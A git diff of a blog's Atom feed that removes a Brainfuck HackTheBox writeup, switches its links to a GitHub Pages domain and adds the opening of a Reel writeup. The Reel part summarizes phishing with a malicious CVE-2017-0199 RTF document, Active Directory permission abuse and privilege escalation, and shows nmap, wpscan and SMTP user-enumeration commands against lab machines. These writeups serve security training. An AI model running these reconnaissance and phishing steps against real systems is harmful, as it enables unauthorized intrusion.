@@ -1,113 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-16T02:02:24+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Insane] - Brainfuck</title><link href="http://localhost:4000/2022/08/16/Brainfuck.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Insane] - Brainfuck" /><published>2022-08-16T00:00:00+02:00</published><updated>2022-08-16T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/16/Brainfuck</id><content type="html" xml:base="http://localhost:4000/2022/08/16/Brainfuck.html"><![CDATA[<p><img src="Brainfuck.png" alt="Sniper" /></p>
-
-<h3 id="summary">Summary</h3>
-<ul>
-  <li>A Linux box where find email ports (SMTP/POP/IMAP) open as well as two https websites (we discovered them from the SSL certificate Subject Alternative Name field)</li>
-  <li>One website had a Wordpress blog which happened to have a vulnerable component that enabled us to impersonate the <code class="language-plaintext highlighter-rouge">admin</code> user.</li>
-  <li>After failing to get code execution using traditional ways (Editing Wordpress themes and Uploading malicious plugins), we search more to find email credentials for the <code class="language-plaintext highlighter-rouge">orestis</code> user in the SMTP plugin installed in Wordpress.</li>
-  <li>We configure a mail client with IMAP and retrieve the mailbox contents for the <code class="language-plaintext highlighter-rouge">orestis</code> user to a set of credentials for the other website which was a forum.</li>
-  <li>After logging in, we find a discussion between the <code class="language-plaintext highlighter-rouge">administrator</code> and <code class="language-plaintext highlighter-rouge">orestis</code> about him losing SSH access and wanting his key.</li>
-  <li>The <code class="language-plaintext highlighter-rouge">administrator</code> says he won’t provide the SSH key in the discussion thread because it would be visible to all forum members. So they switch over to an encrypted one.</li>
-  <li>We do some research on recognizing the Cipher in use to find out it’s a Keyed Vigenere Cipher and are able to figure out the key.</li>
-  <li>After decrypting the messages on the thread, we get a passphrase-protected SSH key. Which we crack using john.</li>
-  <li>We finally login as the <code class="language-plaintext highlighter-rouge">orestis</code> user and find out he’s a member of the <code class="language-plaintext highlighter-rouge">lxd</code> group which enables us to escalate our privileges to <code class="language-plaintext highlighter-rouge">root</code>.</li>
-</ul>
-
-<hr />
-
-<h3 id="nmap-for-the-roadmap">NMAP for the roadmap</h3>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE  VERSION
-22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
-|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
-|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
-25/tcp  open  smtp     Postfix smtpd
-|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
-110/tcp open  pop3     Dovecot pop3d
-|_pop3-capabilities: SASL(PLAIN) USER TOP PIPELINING CAPA UIDL RESP-CODES AUTH-RESP-CODE
-143/tcp open  imap     Dovecot imapd
-|_imap-capabilities: post-login Pre-login IMAP4rev1 have LOGIN-REFERRALS ID capabilities IDLE more OK SASL-IR ENABLE AUTH=PLAINA0001 listed LITERAL+
-443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
-| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
-| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
-| Not valid before: 2017-04-13T11:19:29
-|_Not valid after:  2027-04-11T11:19:29
-|_http-title: Welcome to nginx!
-|_http-server-header: nginx/1.10.0 (Ubuntu)
-|_ssl-date: TLS randomness does not represent time
-| tls-nextprotoneg: 
-|_  http/1.1
-| tls-alpn: 
-|_  http/1.1
-Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre></div></div>
-<p>Looking at the nmap scan results, we notice:</p>
-<ol>
-  <li>SSH version &lt; 7.7 which allows for user enumeration (we might need that to confirm some users’ existence on the box)</li>
-  <li>Mail ports: 25, 110 &amp; 143 for SMTP, POP and IMAP (SMTP = we can send malicious emails and launch client-side attacks while IMAP and POP3 can give us access to user mailboxes if we have credentials)</li>
-  <li>HTTPs on port 443 is a web-based attack surface for us to explore</li>
-</ol>
-
-<p>But we notice that the nmap default script gave us a couple of host names in the commonName and Subject Alternative Name fields:</p>
-<ul>
-  <li>brainfuck.htb</li>
-  <li>www.brainfuck.htb</li>
-  <li>sup3rs3cr3t.brainfuck.htb</li>
-</ul>
-
-<p>Adding those to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> shouldn’t take much time:</p>
-
-<p><img src="setting-etc-hosts.jpg" alt="setting-etc-hosts" /></p>
-
-<h3 id="taking-a-look-at-the-websites">Taking a look at the websites</h3>
-<p>We take a look at www.brainfuck.htb to find a Wordpress Blog</p>
-
-<p><img src="wordpress-first-look.jpg" alt="wordpress-first-look" /></p>
-
-<p>It’s rich with information:</p>
-<ol>
-  <li>we find two usernames: <code class="language-plaintext highlighter-rouge">admin</code> and <code class="language-plaintext highlighter-rouge">orestis</code></li>
-  <li>we find a note about integration with SMTP. which could be a hint</li>
-  <li>we notice a link to “open a ticket” which could be a Wordpress plugin and maybe more functionality to be exploited</li>
-</ol>
-
-<h3 id="enumerating-wordpress">Enumerating Wordpress</h3>
-<p>At this point, it’s both a quick and easy check to run <code class="language-plaintext highlighter-rouge">wpscan</code>. It’s specialized for scanning Wordpress and would give us tons of information on it.</p>
-
-<p>we run it the below command:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> https://brainfuck.htb/ <span class="nt">-e</span> ap,at,tt,cb,dbe,u <span class="nt">--disable-tls-checks</span>
-</code></pre></div></div>
-
-<p>this would enable us to enumerate <code class="language-plaintext highlighter-rouge">-e</code>:</p>
-<ul>
-  <li>All plugins <code class="language-plaintext highlighter-rouge">ap</code></li>
-  <li>All themes <code class="language-plaintext highlighter-rouge">at</code></li>
-  <li>Timthumbs <code class="language-plaintext highlighter-rouge">tt</code></li>
-  <li>Config backups <code class="language-plaintext highlighter-rouge">cb</code></li>
-  <li>Database exports <code class="language-plaintext highlighter-rouge">dbe</code></li>
-  <li>And, Wordpress users <code class="language-plaintext highlighter-rouge">u</code></li>
-</ul>
-
-<p>Looking at the results, we find something interesting:</p>
-
-<p><img src="wp-plugin-discovered.jpg" alt="wp-plugin-discovered" /></p>
-
-<p>We do a search on <a href="https://www.exploit-db.com/">Exploit-DB</a> to find that there is couple of verified exploits that match the version we have:</p>
-
-<p><img src="exploit-db-plugin.jpg" alt="exploit-db-plugin" /></p>
-
-<p>At first, we check out the SQL injection one. But we find out that it requires at least one valid user:</p>
-
-<p><img src="vuln1-user-access-required.jpg" alt="vuln1-user-access-required" /></p>
-
-<p>Luckily however, the second one doesn’t require authentication:</p>
-
-<p><img src="vuln2-user-access-not-required.jpg" alt="" /></p>
-
-<p>And the PoC seems straightforward. Just a form we have to submit:</p>
-
-<p><img src="/Assets/Brainfuck/vuln2-poc.jpg" alt="" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Sniper</title><link href="http://localhost:4000/2022/08/05/Sniper.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Sniper" /><published>2022-08-05T00:00:00+02:00</published><updated>2022-08-05T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/05/Sniper</id><content type="html" xml:base="http://localhost:4000/2022/08/05/Sniper.html"><![CDATA[<p><img src="/assets/Sniper/Sniper.png" alt="Sniper" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://omnisl4sh.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://omnisl4sh.github.io/" rel="alternate" type="text/html" /><updated>2022-08-17T00:59:16+02:00</updated><id>https://omnisl4sh.github.io/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Medium] - Sniper</title><link href="https://omnisl4sh.github.io/2022/08/05/Sniper.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Sniper" /><published>2022-08-05T00:00:00+02:00</published><updated>2022-08-05T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/08/05/Sniper</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/08/05/Sniper.html"><![CDATA[<p><img src="/assets/Sniper/Sniper.png" alt="Sniper" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -584,7 +475,7 @@ Completed after 19.76 seconds
 <span class="p">}</span>
 
 <span class="cp">?&gt;</span>
-</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Insane] - APT</title><link href="http://localhost:4000/2022/07/07/APT.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - APT" /><published>2022-07-07T00:00:00+02:00</published><updated>2022-07-07T00:00:00+02:00</updated><id>http://localhost:4000/2022/07/07/APT</id><content type="html" xml:base="http://localhost:4000/2022/07/07/APT.html"><![CDATA[<p><img src="/assets/APT/APT.png" alt="APT" /></p>
+</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Insane] - APT</title><link href="https://omnisl4sh.github.io/2022/07/07/APT.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - APT" /><published>2022-07-07T00:00:00+02:00</published><updated>2022-07-07T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/07/07/APT</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/07/07/APT.html"><![CDATA[<p><img src="/assets/APT/APT.png" alt="APT" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -1044,7 +935,7 @@ Host script results:
 
 <p><em>Of course,</em> we used the machine hash to do a <strong>DCSync</strong> and grabbed the Administrator’s hash to finish the box :D</p>
 
-<p><img src="/assets/APT/dcsync-and-rooting-the-box.jpg" alt="dcsync-and-rooting-the-box" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Intelligence</title><link href="http://localhost:4000/2022/07/01/Intelligence.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Intelligence" /><published>2022-07-01T00:00:00+02:00</published><updated>2022-07-01T00:00:00+02:00</updated><id>http://localhost:4000/2022/07/01/Intelligence</id><content type="html" xml:base="http://localhost:4000/2022/07/01/Intelligence.html"><![CDATA[<p><img src="/assets/Intelligence/Intelligence.png" alt="Search" /></p>
+<p><img src="/assets/APT/dcsync-and-rooting-the-box.jpg" alt="dcsync-and-rooting-the-box" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Intelligence</title><link href="https://omnisl4sh.github.io/2022/07/01/Intelligence.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Intelligence" /><published>2022-07-01T00:00:00+02:00</published><updated>2022-07-01T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/07/01/Intelligence</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/07/01/Intelligence.html"><![CDATA[<p><img src="/assets/Intelligence/Intelligence.png" alt="Search" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -1385,7 +1276,7 @@ psexec.py <span class="nt">-k</span> <span class="nt">-no-pass</span> intelligen
 
 <p><img src="/assets/Intelligence/box-owned.jpg" alt="box-owned" /></p>
 
-<p>Pretty sweet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Search</title><link href="http://localhost:4000/2022/06/28/Search.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Search" /><published>2022-06-28T00:00:00+02:00</published><updated>2022-06-28T00:00:00+02:00</updated><id>http://localhost:4000/2022/06/28/Search</id><content type="html" xml:base="http://localhost:4000/2022/06/28/Search.html"><![CDATA[<p><img src="/assets/Search/Search.png" alt="Search" /></p>
+<p>Pretty sweet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Search</title><link href="https://omnisl4sh.github.io/2022/06/28/Search.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Search" /><published>2022-06-28T00:00:00+02:00</published><updated>2022-06-28T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/06/28/Search</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/06/28/Search.html"><![CDATA[<p><img src="/assets/Search/Search.png" alt="Search" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -1694,7 +1585,7 @@ Host script results:
 
 <p><img src="/assets/Search/tristan-web-access.jpg" alt="tristan-web-access" /></p>
 
-<p>And this wraps up the path :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Monteverde</title><link href="http://localhost:4000/2022/06/24/Monteverde.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Monteverde" /><published>2022-06-24T00:00:00+02:00</published><updated>2022-06-24T00:00:00+02:00</updated><id>http://localhost:4000/2022/06/24/Monteverde</id><content type="html" xml:base="http://localhost:4000/2022/06/24/Monteverde.html"><![CDATA[<p><img src="/assets/Monteverde/Monteverde.png" alt="Monteverde" /></p>
+<p>And this wraps up the path :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Monteverde</title><link href="https://omnisl4sh.github.io/2022/06/24/Monteverde.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Monteverde" /><published>2022-06-24T00:00:00+02:00</published><updated>2022-06-24T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/06/24/Monteverde</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/06/24/Monteverde.html"><![CDATA[<p><img src="/assets/Monteverde/Monteverde.png" alt="Monteverde" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -2006,7 +1897,7 @@ Host script results:
 
 <p>The creds are good and the box is <strong>owned</strong> :D</p>
 
-<p><img src="/assets/Monteverde/rooted.jpg" alt="rooted" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)</title><link href="http://localhost:4000/2022/05/13/Certifried.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)" /><published>2022-05-13T00:00:00+02:00</published><updated>2022-05-13T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/13/Certifried</id><content type="html" xml:base="http://localhost:4000/2022/05/13/Certifried.html"><![CDATA[<p><img src="/assets/Certifried/Certifried-diagram.jpg" alt="Certifried-diagram" /></p>
+<p><img src="/assets/Monteverde/rooted.jpg" alt="rooted" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)</title><link href="https://omnisl4sh.github.io/2022/05/13/Certifried.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)" /><published>2022-05-13T00:00:00+02:00</published><updated>2022-05-13T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/13/Certifried</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/13/Certifried.html"><![CDATA[<p><img src="/assets/Certifried/Certifried-diagram.jpg" alt="Certifried-diagram" /></p>
 
 <h1 id="the-attack-in-brief">The Attack In Brief</h1>
 <ol>
@@ -2099,7 +1990,7 @@ Host script results:
   <li><strong>Will Schroeder</strong> and <strong>Lee Christensen</strong> who wrote the paper that started it all <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">here</a></li>
   <li><a href="https://twitter.com/ly4k_">Oliver Lyak</a> who discovered, reported and explained the vulnerability <a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">here</a> as well as created the <code class="language-plaintext highlighter-rouge">Certipy</code> tool.</li>
   <li><strong>SecureAuthCorp</strong> for the awesome <strong>Impacket</strong> scripts of course :D</li>
-</ul>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)</title><link href="http://localhost:4000/2022/05/07/Cascade.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)" /><published>2022-05-07T00:00:00+02:00</published><updated>2022-05-07T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/07/Cascade</id><content type="html" xml:base="http://localhost:4000/2022/05/07/Cascade.html"><![CDATA[<p><img src="/assets/Cascade/Cascade.png" alt="Cascade" /></p>
+</ul>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)</title><link href="https://omnisl4sh.github.io/2022/05/07/Cascade.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)" /><published>2022-05-07T00:00:00+02:00</published><updated>2022-05-07T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/07/Cascade</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/07/Cascade.html"><![CDATA[<p><img src="/assets/Cascade/Cascade.png" alt="Cascade" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -2479,7 +2370,7 @@ Host script results:
 
 <p><img src="/assets/Cascade/got-admin-at-last.jpg" alt="got-admin-at-last" /></p>
 
-<p>And we finally own the box after following all those breadcrumbs XD</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)</title><link href="http://localhost:4000/2022/05/06/Mantis.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)" /><published>2022-05-06T00:00:00+02:00</published><updated>2022-05-06T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/06/Mantis</id><content type="html" xml:base="http://localhost:4000/2022/05/06/Mantis.html"><![CDATA[<p><img src="/assets/Mantis/Mantis.png" alt="Mantis" /></p>
+<p>And we finally own the box after following all those breadcrumbs XD</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)</title><link href="https://omnisl4sh.github.io/2022/05/06/Mantis.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)" /><published>2022-05-06T00:00:00+02:00</published><updated>2022-05-06T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/06/Mantis</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/06/Mantis.html"><![CDATA[<p><img src="/assets/Mantis/Mantis.png" alt="Mantis" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -2827,7 +2718,7 @@ Host script results:
 
 <p><img src="/assets/Mantis/pykek-for-the-win.jpg" alt="pykek-for-the-win" /></p>
 
-<p>Sweeeet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)</title><link href="http://localhost:4000/2022/05/02/Sizzle.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)" /><published>2022-05-02T00:00:00+02:00</published><updated>2022-05-02T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/02/Sizzle</id><content type="html" xml:base="http://localhost:4000/2022/05/02/Sizzle.html"><![CDATA[<p><img src="/assets/Sizzle/Sizzle.png" alt="Sizzle" /></p>
+<p>Sweeeet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)</title><link href="https://omnisl4sh.github.io/2022/05/02/Sizzle.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)" /><published>2022-05-02T00:00:00+02:00</published><updated>2022-05-02T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/02/Sizzle</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/02/Sizzle.html"><![CDATA[<p><img src="/assets/Sizzle/Sizzle.png" alt="Sizzle" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -3201,4 +3092,387 @@ Command=ToggleDesktop
 
 <p>OR…</p>
 
-<p><img src="/assets/Sizzle/zero-logon-XD.jpg" alt="zero-logon-XD" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
+<p><img src="/assets/Sizzle/zero-logon-XD.jpg" alt="zero-logon-XD" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Reel (AD Pentesting Track #6)</title><link href="https://omnisl4sh.github.io/2022/04/30/Reel.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Reel (AD Pentesting Track #6)" /><published>2022-04-30T00:00:00+02:00</published><updated>2022-04-30T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/30/Reel</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/30/Reel.html"><![CDATA[<p><img src="/assets/Reel/Reel.png" alt="Reel" /></p>
+
+<h3 id="summary">Summary</h3>
+<ul>
+  <li>A <strong>windows machine</strong> with <code class="language-plaintext highlighter-rouge">Anonymous FTP</code> allowed. <em>Inspecting the contents</em> reveals a <strong>documents folder</strong> one of which tells us that <em>RTF documents are being reviewed and converted by someone</em>.</li>
+  <li><em>Using this information,</em> we craft a <em>malicious document</em> using <strong>CVE-2017-0199</strong> and send it to a certain user called <code class="language-plaintext highlighter-rouge">nico</code> via the open <code class="language-plaintext highlighter-rouge">SMTP</code> port (<em>We find his username by checking the metadata of the documents on FTP</em>).</li>
+  <li><em>When the document is opened,</em> we get a shell back as <code class="language-plaintext highlighter-rouge">nico</code> and start enumerating the machine.</li>
+  <li><em>With BloodHound,</em> we find that nico has a <code class="language-plaintext highlighter-rouge">WriteOwner</code> right over another user <code class="language-plaintext highlighter-rouge">herman</code> who has a <code class="language-plaintext highlighter-rouge">WriteDACL</code> over a certain group called <code class="language-plaintext highlighter-rouge">Backup_Admins</code>.</li>
+  <li>We abuse the <code class="language-plaintext highlighter-rouge">WriteOwner</code> right to grant ourselves the right to reset <code class="language-plaintext highlighter-rouge">herman</code>’s password and abuse the <code class="language-plaintext highlighter-rouge">WriteDACL</code> to add him to the <code class="language-plaintext highlighter-rouge">Backup_Admins</code> group.</li>
+  <li>We then find out that <code class="language-plaintext highlighter-rouge">Backup_Admins</code> have access to a certain folder called <code class="language-plaintext highlighter-rouge">Backup Scripts</code> on the <code class="language-plaintext highlighter-rouge">Administrator</code>’s desktop on the box.</li>
+  <li><em>Within that folder,</em> we find a script that contains the password for the local administrator which works and we use it to login using the open <code class="language-plaintext highlighter-rouge">SSH</code> port.</li>
+  <li>A <em>Similar path</em> exists with another user <code class="language-plaintext highlighter-rouge">tom</code> whom his credentials are present in a <code class="language-plaintext highlighter-rouge">creds.xml</code> file on <code class="language-plaintext highlighter-rouge">nico</code>’s desktop as a <code class="language-plaintext highlighter-rouge">secure string</code>.</li>
+  <li>The clear-text credentials can be retrieved to gain access as <code class="language-plaintext highlighter-rouge">tom</code> using <code class="language-plaintext highlighter-rouge">SSH</code>. <code class="language-plaintext highlighter-rouge">tom</code> has <code class="language-plaintext highlighter-rouge">WriteOwner</code> on <code class="language-plaintext highlighter-rouge">claire</code> who has a <code class="language-plaintext highlighter-rouge">WriteDACL</code> on <code class="language-plaintext highlighter-rouge">Backup_Admins</code>.</li>
+  <li>Another path exists with abusing the <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> held by <code class="language-plaintext highlighter-rouge">tom</code> since he’s a member of the <code class="language-plaintext highlighter-rouge">Print Operators</code> group.</li>
+  <li>The box is also vulnerable to <code class="language-plaintext highlighter-rouge">CVE-2018-8440</code> and <code class="language-plaintext highlighter-rouge">CVE-2019-1458</code> local privilege escalation exploits.</li>
+</ul>
+
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<p><em>Looking at the</em> <code class="language-plaintext highlighter-rouge">nmap</code> <em>scan,</em> we find very few ports running:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION                                                                                      
+21/tcp open  ftp     Microsoft ftpd                                                                               
+| ftp-syst:                                                                                                       
+|_  SYST: Windows_NT                                                                                              
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                            
+|_05-29-18  12:19AM       &lt;DIR&gt;          documents                                                                
+22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)                                                                   
+| ssh-hostkey:                                                                                                    
+|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)            
+|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)           
+|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)         
+25/tcp open  smtp?                                                                                                
+| fingerprint-strings:                                                                                            
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
+|     220 Mail Service ready                                                                                      
+|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
+|     220 Mail Service ready                                                                                      
+|     sequence of commands                                                                                        
+|     sequence of commands                                                                                        
+|   Hello:                                                                                                        
+|     220 Mail Service ready                                                                                      
+|     EHLO Invalid domain address.                                                                                
+|   Help:                                                                                                         
+|     220 Mail Service ready                                                                                      
+|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY              
+|   SIPOptions:                                                                                                   
+|     220 Mail Service ready                                                                                      
+|     sequence of commands                                                                                        
+|     sequence of commands
+|     sequence of commands                              
+|     sequence of commands
+|     sequence of commands                                                                                        
+|     sequence of commands                                                                                        
+|     sequence of commands
+|     sequence of commands                    
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|   TerminalServerCookie: 
+|     220 Mail Service ready
+|_    sequence of commands
+| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+</code></pre></div></div>
+
+<h3 id="anonymous-ftp">Anonymous FTP</h3>
+<p><em>Checking</em> <strong>FTP</strong>, we come across 3 files:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Applocker.docx</code></li>
+  <li><code class="language-plaintext highlighter-rouge">readme.txt</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Windows Event Forwarding.docx</code></li>
+</ul>
+
+<p><img src="/assets/Reel/ftp-listing.jpg" alt="ftp-listing" /></p>
+
+<h3 id="contents-of-readmetxt">Contents of readme.txt</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>please email me any rtf format procedures - I'll review and convert.
+
+new format / converted documents will be saved here.
+</code></pre></div></div>
+
+<h3 id="looks-like-were-going-phishing-d">Looks like we’re going phishing :D</h3>
+<p>the content is about someone asking to be emailed RTF formats (a type of document) for him/her to review and convert.</p>
+
+<p>This seems like a <strong>Phishing Challenge</strong>. <em>In order to exploit,</em> we need to:</p>
+<ol>
+  <li>Find out who that user is</li>
+  <li>Find a way to create a malicious RTF file</li>
+  <li>Find a way to send an email using the open SMTP port</li>
+</ol>
+
+<h3 id="enumerating-smtp">Enumerating SMTP</h3>
+<p>We use a tool called <code class="language-plaintext highlighter-rouge">smtp-user-enum</code> which lets us find if a given user exists or not.</p>
+
+<p>It uses a couple of <strong>SMTP</strong> commands to do that:</p>
+<ol>
+  <li>VRFY</li>
+  <li>EXPN</li>
+  <li>RCPT</li>
+</ol>
+
+<p>we give it a list of male/female names from the <strong>SecLists</strong> Github Repo to try while we look at how to create a malicious document.</p>
+
+<p><img src="/assets/Reel/male-female-wordlists.jpg" alt="male-female-wordlists" /></p>
+
+<p>the command is:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smtp-user-enum <span class="nt">-M</span> VRFY <span class="nt">-U</span> users.txt <span class="nt">-t</span> 10.10.10.77
+</code></pre></div></div>
+
+<p>That takes a while to run. And it comes up short. <em>So we move on…</em></p>
+
+<h3 id="checking-file-metadata-using-exiftool">Checking file metadata using <code class="language-plaintext highlighter-rouge">exiftool</code></h3>
+
